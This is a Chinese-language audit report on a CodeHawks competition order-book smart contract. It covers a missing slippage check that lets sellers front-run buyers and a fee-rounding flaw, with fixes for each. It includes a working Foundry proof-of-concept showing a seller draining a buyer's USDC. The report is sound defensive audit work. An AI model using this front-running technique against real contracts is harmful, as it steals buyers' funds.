# OrderBook 智能合约审计报告

> DuoLaSafe 智能合约审计 · CodeHawks 2025-07-orderbook · 2026-06-27
> 联系:Telegram @dsa885 · X @hunterweb303

---

## 一、审计范围

| 项目 | 内容 |
| --- | --- |
| 标的 | CodeHawks First Flight `2025-07-orderbook` |
| 合约 | `src/OrderBook.sol`(nSLOC ≈ 217) |
| 链 / 框架 | Ethereum / Foundry，Solidity `^0.8.0` |
| 资产 | wETH(18)、wBTC(8)、wSOL(18) 作为出售标的;USDC(6) 作为计价货币 |
| 提交 | `--depth 1` 最新 main(审计时) |
| 编译 | `Solc 0.8.26`,`forge build` 通过 |

**合约定位:** 链上点对点固定价格订单簿。卖家锁仓 ERC20 代币挂单(指定 USDC 总价 + 截止时间),买家支付 USDC 成交,协议抽 3% 手续费。支持改单(`amendSellOrder`)、撤单(`cancelSellOrder`)、Owner 紧急提取非核心代币、提取手续费。

---

## 二、发现汇总

| 编号 | 严重度 | 标题 | 状态 |
| --- | --- | --- | --- |
| H-01 | **High** | `buyOrder` 无滑点保护,卖家可抢跑 `amendSellOrder` 抽干买家 USDC | PoC 通过 |
| L-01 | Low | 手续费计算精度丢失,小额订单手续费向下取整为 0 | PoC 通过 |
| —    | 已排除 | 代币被移出白名单不会锁死卖家资金 | 验证排除 |
| —    | 已排除 | 手续费会计 `totalFees` 与实际 USDC 余额一致 | 验证排除 |

---

## H-01 [High] `buyOrder` 缺乏滑点/成交参数保护,卖家可通过 `amendSellOrder` 抢跑抽干买家

### 位置
`src/OrderBook.sol` — `buyOrder()`(L194–213) 与 `amendSellOrder()`(L138–175)

### 根因
`buyOrder(uint256 _orderId)` 只接收一个订单 ID,**不接收买家可接受的最高价格(maxPrice)或最低收货量(minAmountOut)**。成交时合约直接读取订单当下的 `priceInUSDC` 与 `amountToSell`:

```solidity
function buyOrder(uint256 _orderId) public {
    Order storage order = orders[_orderId];
    ...
    uint256 protocolFee = (order.priceInUSDC * FEE) / PRECISION;
    uint256 sellerReceives = order.priceInUSDC - protocolFee;
    iUSDC.safeTransferFrom(msg.sender, address(this), protocolFee);
    iUSDC.safeTransferFrom(msg.sender, order.seller, sellerReceives);   // 按"当前"价扣款
    IERC20(order.tokenToSell).safeTransfer(msg.sender, order.amountToSell);
}
```

同时 `amendSellOrder` 允许卖家在订单 `isActive` 且未过期时**任意上调 `priceInUSDC`、下调 `amountToSell`**,且改单是普通 `public` 函数、无时间锁、无版本号/nonce:

```solidity
function amendSellOrder(uint256 _orderId, uint256 _newAmountToSell, uint256 _newPriceInUSDC, uint256 _newDeadlineDuration) public {
    ...
    order.amountToSell = _newAmountToSell;   // 可改小,多余代币退还卖家
    order.priceInUSDC  = _newPriceInUSDC;    // 可改大
    ...
}
```

由于 ERC20 `approve` 在实践中普遍是一次性无限授权(`type(uint256).max`)或宽松授权,买家对该订单的成交意图与最终扣款金额之间**没有任何绑定**。

### 影响
经典的"无滑点保护 + 可变价"组合,构成可获利的抢跑(front-running)/三明治攻击:

1. 买家看到订单"1 wBTC 卖 1000 USDC",对 OrderBook 授权 USDC 后提交 `buyOrder(id)`。
2. 恶意卖家(或与之合谋的搜索者)在内存池看到该交易,抢先广播一笔 `amendSellOrder(id, 1, 900_000e6, ...)`,把价格抬到 90 万 USDC、收货量砍到 1 个最小单位(satoshi)。
3. 买家的 `buyOrder` 紧随其后上链,**按被篡改后的恶意价格成交、不会 revert**:买家被扣走 900,000 USDC,只拿到 1 satoshi 的 wBTC;卖家此前已通过改单把几乎全部 wBTC 退回自己钱包。

结果是买家**直接、可被攻击者主动触发的资金损失**,损失额仅受买家授权额度上限约束。即使没有恶意抢跑,在正常拥堵下买家也可能以与下单时不一致的价格成交。

### PoC

测试文件:`test/DuoLaSafePoC.t.sol` — `test_FrontRunAmendDrainsBuyer`

```solidity
function test_FrontRunAmendDrainsBuyer() public {
    // Alice 挂单:1 wBTC 卖 1000 USDC
    vm.startPrank(alice);
    wbtc.approve(address(book), 1e8);
    uint256 id = book.createSellOrder(address(wbtc), 1e8, 1000e6, 1 days);
    vm.stopPrank();

    // Bob 授权(常见的无限授权)
    vm.prank(bob);
    usdc.approve(address(book), type(uint256).max);

    // 抢跑:Alice 看到 Bob 待打包的 buyOrder,先改单
    // 涨价到 900,000 USDC,收货量砍到 1 satoshi
    vm.prank(alice);
    book.amendSellOrder(id, 1, 900_000e6, 1 days);

    uint256 bobBefore = usdc.balanceOf(bob);

    // Bob 的 buyOrder 按被篡改后的恶意条款成交,无 revert
    vm.prank(bob);
    book.buyOrder(id);

    uint256 bobPaid = bobBefore - usdc.balanceOf(bob);
    assertEq(bobPaid, 900_000e6, "buyer drained at amended price"); // 被扣 90 万
    assertEq(wbtc.balanceOf(bob), 1, "buyer got only 1 satoshi");   // 只拿到 1 satoshi
    assertEq(wbtc.balanceOf(alice), 10e8 - 1, "seller recovered all but dust");
}
```

forge 输出:

```
Ran 4 tests for test/DuoLaSafePoC.t.sol:DuoLaSafePoC
[PASS] test_FrontRunAmendDrainsBuyer() (gas: 348274)
Suite result: ok. 4 passed; 0 failed; 0 skipped
```

### 修复建议
为成交函数引入买家侧的成交保护参数,把"买家看到的价格"与"实际扣款"强绑定:

```solidity
function buyOrder(uint256 _orderId, uint256 _maxPriceInUSDC, uint256 _minAmountToReceive) public {
    Order storage order = orders[_orderId];
    ...
    if (order.priceInUSDC > _maxPriceInUSDC) revert PriceTooHigh();
    if (order.amountToSell < _minAmountToReceive) revert AmountTooLow();
    ...
}
```

补充建议(任选其一并行加固):
- 改单后让旧的成交意图失效:为订单引入单调递增的 `version`/`nonce`,`buyOrder` 传入期望版本号,改单即递增版本;
- 对 `amendSellOrder` 的"涨价/减量"路径加保护或冷却时间,避免即时生效。

---

## L-01 [Low] 手续费精度丢失,小额订单手续费向下取整为 0

### 位置
`src/OrderBook.sol` — `buyOrder()` L203:`uint256 protocolFee = (order.priceInUSDC * FEE) / PRECISION;`

### 根因
手续费 = `priceInUSDC * 3 / 100`,整数除法向下取整。当 `priceInUSDC * 3 < 100`(即 `priceInUSDC <= 33` 个最小单位)时,手续费计算结果为 0。USDC 为 6 位小数,33 个最小单位 ≈ \$0.000033,属极小金额。

### 影响
极小额订单可零手续费成交,协议手续费收入被规避。单笔影响微乎其微,正常业务下不构成实质损失,故评为 **Low / 信息级**;但属于真实的会计偏差,且攻击者可批量构造微额订单系统性地白嫖撮合服务。

### PoC
`test/DuoLaSafePoC.t.sol` — `test_FeeRoundsToZero`(已 PASS):`priceInUSDC = 33` 时 `fee == 0`,买家成功拿走代币、`totalFees` 不增长。

```
[PASS] test_FeeRoundsToZero() (gas: 294437)
```

### 修复建议
要么对手续费向上取整(`(price * FEE + PRECISION - 1) / PRECISION`),要么设置最小订单价格/最小手续费下限,使任何成交都至少产生 1 单位手续费。

---

## 三、对抗性验证与已排除项

为避免误报,对以下"看似漏洞"的点做了 PoC 验证并**主动排除**:

1. **代币被移出白名单是否锁死卖家资金?——否,已排除。**
   `cancelSellOrder` 与 `buyOrder` 均**不**校验 `allowedSellToken`,只有 `createSellOrder` 校验。因此 Owner 调用 `setAllowedSellToken(token, false)` 后,已存在订单的卖家仍可正常撤单取回代币,买家也仍可成交。`test_DeallowlistDoesNotLockSeller` 验证撤单成功、卖家全额取回,**不构成资金锁定漏洞**。

2. **手续费会计 `totalFees` 是否会超提/虚增?——否,已排除。**
   成交时 `protocolFee` 进合约、`sellerReceives` 直转卖家,`totalFees += protocolFee`。`withdrawFees` 提取 `totalFees` 后清零。`test_FeeAccountingConsistent` 验证成交后合约 USDC 余额恰等于 `totalFees`,Owner 提取后余额归零,**会计自洽**。

3. **重入?** 成交/撤单/改单均遵循"先改状态(`isActive=false` / 更新 `amountToSell`)后转账"的 checks-effects-interactions 顺序,且转账对象为固定地址(卖家/买家/合约);在 wETH/wBTC/wSOL/USDC 这类标准 ERC20(无回调)假设下无可利用重入路径,未列为发现。

4. **Owner 紧急提取 `emergencyWithdrawERC20`** 明确禁止提取四种核心代币(wETH/wBTC/wSOL/USDC),无法借此盗取托管资金,符合预期。

---

## 四、方法论

1. **clone 与环境复现:** 经代理拉取标的,补齐 `forge-std` 与 `openzeppelin-contracts` 依赖并修正 `@openzeppelin/contracts/` remapping,`forge build`(Solc 0.8.26)通过。
2. **人工审计:** 按订单簿高危清单逐项排查——下单/撮合/撤单/改单的会计与状态机、资金托管、ERC20 授权模型、重入、价格与手续费计算、整数溢出/精度、访问控制、白名单与紧急函数。
3. **PoC 驱动:** 每个候选发现都写成 Foundry 测试,**只保留能 PASS 复现的**;对"疑似漏洞"同样写排除型测试,确认非漏洞后明确排除,杜绝凑数与编造。
4. **复现命令:**
   ```bash
   export PATH="$HOME/.foundry/bin:$PATH"
   cd /tmp/ff-orderbook
   forge test --match-contract DuoLaSafePoC -vv
   ```
   结果:`4 passed; 0 failed`。

---

## 五、免责声明

本报告基于审计时点提供的代码快照,仅覆盖 `src/OrderBook.sol` 范围内的逻辑。智能合约审计无法证明代码绝对无漏洞;本报告不构成对合约安全性的担保,亦不构成任何投资建议。部署前请完成依赖库版本锁定、完整测试覆盖与必要的进一步复核。修复后建议复审。

— DuoLaSafe · Telegram @dsa885 · X @hunterweb303
